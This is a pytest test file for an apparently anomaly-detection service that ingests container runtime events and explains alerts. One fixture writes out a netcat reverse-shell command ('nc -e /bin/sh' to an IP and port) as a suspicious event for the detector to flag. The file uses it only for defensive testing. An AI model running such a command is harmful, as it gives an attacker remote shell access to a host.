import pytest
from fastapi.testclient import TestClient
from main import app, EVENTS_DB, ANOMALY_ALERTS

client = TestClient(app)

def setup_function():
    EVENTS_DB.clear()
    ANOMALY_ALERTS.clear()

def test_healthz():
    response = client.get("/healthz")
    assert response.status_code == 200
    assert response.json()["status"] == "healthy"

def test_metrics():
    response = client.get("/metrics")
    assert response.status_code == 200
    assert b"ai_brain_ingested_events_total" in response.content

def test_ingest_normal_event():
    evt = {
        "id": "evt-normal-01",
        "event_type": "exec",
        "namespace": "prod",
        "pod_name": "app-5999",
        "binary_path": "/usr/bin/app",
        "command_args": ["--port", "8080"],
        "syscall": "sys_execve",
        "pid": 100,
        "uid": 1000
    }
    response = client.post("/ingest", json=evt)
    assert response.status_code == 201
    data = response.json()
    assert data["status"] == "ingested"
    assert data["event_id"] == "evt-normal-01"
    assert "anomaly_score" in data

def test_ingest_and_analyze_suspicious_event():
    evt = {
        "id": "evt-suspicious-01",
        "event_type": "exec",
        "namespace": "prod",
        "pod_name": "payment-api-789",
        "binary_path": "/usr/bin/nc",
        "command_args": ["-e", "/bin/sh", "10.0.0.1", "4444"],
        "syscall": "sys_execve",
        "pid": 999,
        "uid": 0
    }
    ingest_resp = client.post("/ingest", json=evt)
    assert ingest_resp.status_code == 201
    ingest_data = ingest_resp.json()
    assert ingest_data["anomaly_score"] > 0.5

    analyze_resp = client.post("/analyze", json={"event_id": "evt-suspicious-01", "top_k": 2})
    assert analyze_resp.status_code == 200
    analyze_data = analyze_resp.json()
    assert len(analyze_data["rag_matches"]) > 0
    assert analyze_data["rag_matches"][0]["kb_item"]["category"] == "reverse_shell"

def test_explain_anomaly():
    rag_context = {
        "rag_matches": [
            {
                "kb_item": {
                    "title": "Reverse Shell Execution Detected",
                    "recommendation": "Trigger Argo Rollout restart immediately."
                }
            }
        ]
    }
    explain_resp = client.post("/explain", json={
        "event_id": "evt-suspicious-01",
        "anomaly_score": 0.95,
        "rag_context": rag_context
    })
    assert explain_resp.status_code == 200
    explain_data = explain_resp.json()
    assert "Reverse Shell Execution Detected" in explain_data["explanation"]
